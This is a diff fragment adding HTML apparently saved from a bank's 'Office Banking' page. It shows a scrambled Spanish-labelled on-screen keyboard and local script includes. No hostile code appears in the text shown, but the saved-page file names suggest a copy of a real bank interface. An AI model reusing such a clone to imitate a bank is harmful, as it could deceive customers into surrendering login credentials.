+                    <div class="hg-button hg-standardBtn" data-skbtn="7" data-skbtnuid="default-r0b2"
+                        data-displaylabel="7"><span>7</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="1" data-skbtnuid="default-r0b3"
+                        data-displaylabel="1"><span>1</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="6" data-skbtnuid="default-r0b4"
+                        data-displaylabel="6"><span>6</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="0" data-skbtnuid="default-r0b5"
+                        data-displaylabel="0"><span>0</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="3" data-skbtnuid="default-r0b6"
+                        data-displaylabel="3"><span>3</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="9" data-skbtnuid="default-r0b7"
+                        data-displaylabel="9"><span>9</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="8" data-skbtnuid="default-r0b8"
+                        data-displaylabel="8"><span>8</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="2" data-skbtnuid="default-r0b9"
+                        data-displaylabel="2"><span>2</span></div>
+                    <div class="hg-button hg-functionBtn hg-button-bksp" data-skbtn="{bksp}"
+                        data-skbtnuid="default-r0b10" data-displaylabel="Borrar"><span>Borrar</span></div>
+                </div>
+                <div class="hg-row">
+                    <div class="hg-button hg-functionBtn hg-button-tab" data-skbtn="{tab}" data-skbtnuid="default-r1b0"
+                        data-displaylabel="Tab"><span>Tab</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="r" data-skbtnuid="default-r1b1"
+                        data-displaylabel="r"><span>r</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="o" data-skbtnuid="default-r1b2"
+                        data-displaylabel="o"><span>o</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="p" data-skbtnuid="default-r1b3"
+                        data-displaylabel="p"><span>p</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="q" data-skbtnuid="default-r1b4"
+                        data-displaylabel="q"><span>q</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="]" data-skbtnuid="default-r1b5"
+                        data-displaylabel="]"><span>]</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="i" data-skbtnuid="default-r1b6"
+                        data-displaylabel="i"><span>i</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="w" data-skbtnuid="default-r1b7"
+                        data-displaylabel="w"><span>w</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="e" data-skbtnuid="default-r1b8"
+                        data-displaylabel="e"><span>e</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="y" data-skbtnuid="default-r1b9"
+                        data-displaylabel="y"><span>y</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="[" data-skbtnuid="default-r1b10"
+                        data-displaylabel="["><span>[</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="u" data-skbtnuid="default-r1b11"
+                        data-displaylabel="u"><span>u</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="t" data-skbtnuid="default-r1b12"
+                        data-displaylabel="t"><span>t</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="\" data-skbtnuid="default-r1b13"
+                        data-displaylabel="\"><span>\</span></div>
+                </div>
+                <div class="hg-row">
+                    <div class="hg-button hg-functionBtn hg-button-lock" data-skbtn="{lock}"
+                        data-skbtnuid="default-r2b0" data-displaylabel="Bloq Mayús"><span>Bloq Mayús</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="&#39;" data-skbtnuid="default-r2b1"
+                        data-displaylabel="&#39;"><span>'</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="k" data-skbtnuid="default-r2b2"
+                        data-displaylabel="k"><span>k</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="d" data-skbtnuid="default-r2b3"
+                        data-displaylabel="d"><span>d</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="h" data-skbtnuid="default-r2b4"
+                        data-displaylabel="h"><span>h</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="g" data-skbtnuid="default-r2b5"
+                        data-displaylabel="g"><span>g</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="j" data-skbtnuid="default-r2b6"
+                        data-displaylabel="j"><span>j</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="a" data-skbtnuid="default-r2b7"
+                        data-displaylabel="a"><span>a</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="ñ" data-skbtnuid="default-r2b8"
+                        data-displaylabel="ñ"><span>ñ</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="s" data-skbtnuid="default-r2b9"
+                        data-displaylabel="s"><span>s</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="l" data-skbtnuid="default-r2b10"
+                        data-displaylabel="l"><span>l</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="f" data-skbtnuid="default-r2b11"
+                        data-displaylabel="f"><span>f</span></div>
+                    <div class="hg-button hg-functionBtn hg-button-enter" data-skbtn="{enter}"
+                        data-skbtnuid="default-r2b12" data-displaylabel="Intro"><span>Intro</span></div>
+                </div>
+                <div class="hg-row">
+                    <div class="hg-button hg-functionBtn hg-button-shift" data-skbtn="{shift}"
+                        data-skbtnuid="default-r3b0" data-displaylabel="Shift"><span>Shift</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="," data-skbtnuid="default-r3b1"
+                        data-displaylabel=","><span>,</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="m" data-skbtnuid="default-r3b2"
+                        data-displaylabel="m"><span>m</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="z" data-skbtnuid="default-r3b3"
+                        data-displaylabel="z"><span>z</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="x" data-skbtnuid="default-r3b4"
+                        data-displaylabel="x"><span>x</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="/" data-skbtnuid="default-r3b5"
+                        data-displaylabel="/"><span>/</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="n" data-skbtnuid="default-r3b6"
+                        data-displaylabel="n"><span>n</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="." data-skbtnuid="default-r3b7"
+                        data-displaylabel="."><span>.</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="b" data-skbtnuid="default-r3b8"
+                        data-displaylabel="b"><span>b</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="c" data-skbtnuid="default-r3b9"
+                        data-displaylabel="c"><span>c</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="v" data-skbtnuid="default-r3b10"
+                        data-displaylabel="v"><span>v</span></div>
+                    <div class="hg-button hg-functionBtn hg-button-shift" data-skbtn="{shift}"
+                        data-skbtnuid="default-r3b11" data-displaylabel="Shift"><span>Shift</span></div>
+                </div>
+                <div class="hg-row">
+                    <div class="hg-button hg-functionBtn hg-button-space" data-skbtn="{space}"
+                        data-skbtnuid="default-r4b0" data-displaylabel="Espacio"><span>Espacio</span></div>
+                </div>
+            </div>
+            <script src="./Office Banking_files/borders.js.descarga" type="text/javascript"></script>
+            <script type="text/javascript" src="./Office Banking_files/simple-keyboard.min.js.descarga"></script>
+            <script src="./Office Banking_files/polyfill.js.descarga" type="text/javascript"></script>
+            <script src="./Office Banking_files/keyboard.js.descarga" type="text/javascript"></script>
+
+
+
+            <div id="message_box" style="display:none"></div>
+        </section>
+    </div>
+
+
+
+
+</body>
+
+</html>
